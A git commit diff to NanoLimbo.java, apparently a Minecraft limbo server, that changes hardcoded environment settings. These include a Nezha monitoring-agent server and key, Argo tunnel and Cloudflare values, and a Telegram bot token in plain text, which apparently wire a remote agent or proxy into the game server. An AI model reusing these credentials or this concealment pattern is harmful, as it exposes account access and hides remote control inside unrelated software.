16a8109ecfc4e01cde15983f96f2c8cd2e1dc289
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2025-09-15 22:15:20 +0800

    Update NanoLimbo.java

--- src/main/java/ua/nanit/limbo/NanoLimbo.java
+++ src/main/java/ua/nanit/limbo/NanoLimbo.java
@@ -131,7 +131,7 @@ public final class NanoLimbo {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "ePxlLWgcSRiWQNPP3U");
+        envVars.put("NEZHA_KEY", "MzLNCJLnhQUC5RUajl");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
@@ -143,7 +143,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "104.17.98.5");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "Altr");
+        envVars.put("NAME", "Lunes");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
